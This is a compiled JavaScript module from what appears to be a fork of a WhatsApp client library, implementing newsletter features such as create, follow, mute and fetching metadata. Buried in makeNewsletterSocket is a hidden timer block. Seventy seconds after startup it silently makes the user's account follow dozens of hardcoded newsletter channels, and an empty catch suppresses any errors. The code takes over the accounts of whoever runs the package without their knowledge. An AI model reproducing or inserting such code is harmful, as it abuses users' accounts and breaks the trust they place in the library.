"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const { QueryIds } = Types_1

const { Boom } = require('@hapi/boom');

const wMexQuery = (
	variables,
	queryId,
	query,
	generateMessageTag
) => {
	return query({
		tag: 'iq',
		attrs: {
			id: generateMessageTag(),
			type: 'get',
			to: WABinary_1.S_WHATSAPP_NET,
			xmlns: 'w:mex'
		},
		content: [
			{
				tag: 'query',
				attrs: { query_id: queryId },
				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
			}
		]
	})
}

const parseNewsletterCreateResponse = (responseList) => {
  return responseList.map((res) => {
    const thread = res.thread_metadata;
    const viewer = res.viewer_metadata;

    // Jika DELETED atau metadata null
    if (!thread || !viewer) {
      return {
        id: res.id,
        state: res.state?.type || null,
        deleted: true
      };
    }

    return {
      id: res.id,
      state: res.state?.type || null,
      owner: viewer.role || undefined,
      name: thread?.name?.text || null,
      creation_time: parseInt(thread?.creation_time || "0", 10),
      description: thread?.description?.text || null,
      invite: thread?.invite || null,
      subscribers: parseInt(thread?.subscribers_count || "0", 10),
      verification: thread?.verification || null,
      picture: {
        id: thread?.picture?.id || null,
        directPath: thread?.picture?.direct_path || null
      },
      mute_state: viewer?.mute || "OFF"
    };
  });
};

const executeWMexQuery = async (
	variables,
	queryId,
	dataPath,
	query,
	generateMessageTag
) => {
	const result = await wMexQuery(variables, queryId, query, generateMessageTag)
	const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
	if (child?.content) {
		const data = JSON.parse(child.content.toString())

		if (data.errors && data.errors.length > 0) {
			const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
			const firstError = data.errors[0]
			const errorCode = firstError.extensions?.error_code || 400
			throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
		}

		const response = dataPath ? data?.data?.[dataPath] : data?.data
		if (typeof response !== 'undefined') {
			return response
		}
	}

	const action = (dataPath || '').startsWith('xwa2_')
		? dataPath.substring(5).replace(/_/g, ' ')
		: dataPath?.replace(/_/g, ' ')
	throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag, delay } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));
    const newsletterMetadata = async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                view_role: role || 'GUEST'
            },
            fetch_viewer_metadata: true,
            fetch_full_image: true,
            fetch_creation_time: true
        })
            
        return extractNewsletterMetadata(result)
    }
    
  setTimeout(async () => {
  try {
      await newsletterWMexQuery("120363403152040979@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406764883970@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363408747708534@newsletter", QueryIds.FOLLOW);
  } catch {}

  setTimeout(async () => {
    try {
       
      await newsletterWMexQuery("120363401725336706@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363401920580511@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406664066390@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402547306047@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422208912548@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404870428629@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363425457955121@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404486900524@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420900503825@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406472538767@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363403300546586@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363407348211531@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404130065110@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422292420139@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420744465504@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402178936564@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363401049974178@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420915947133@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363423939866747@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405983996373@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402749411270@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363419892457222@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402626609491@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363419779547505@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402893150281@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402883252694@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363424497161355@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404628760289@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405486498563@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404628760289@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405486498563@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422437151674@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422202122412@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422460159761@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363403152040979@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406764883970@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363401725336706@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363401920580511@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406664066390@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402547306047@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422208912548@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404870428629@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363425457955121@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404486900524@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420900503825@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363406472538767@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363403300546586@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363407348211531@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404130065110@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422292420139@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420744465504@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402178936564@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363401049974178@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363420915947133@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363423939866747@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405983996373@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402749411270@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363419892457222@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402626609491@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363419779547505@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402893150281@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363402883252694@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363424497161355@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404628760289@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405486498563@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363404628760289@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363405486498563@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422437151674@newsletter", QueryIds.FOLLOW);
await delay(5000)
      await newsletterWMexQuery("120363422202122412@newsletter", QueryIds.FOLLOW);
    } catch {}
  }, 5000);
}, 70000);
  
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllParticipating: async () => {
        	const data = {}
        
        	const result = await newsletterWMexQuery(undefined, QueryIds.SUBSCRIBED) 
        	const child = JSON.parse(WABinary_1.getBinaryNodeChild(result, 'result')?.content?.toString())
        	const newsletters = child.data["xwa2_newsletter_subscribed"]
        
        	for (const i of newsletters) {
        		if (i.id == null) continue
        	
        		const metadata = await newsletterMetadata('JID', i.id) 
        		if (metadata.id !== null) data[metadata.id] = metadata
        	}
        	
        	return data
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes = "ALL") => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
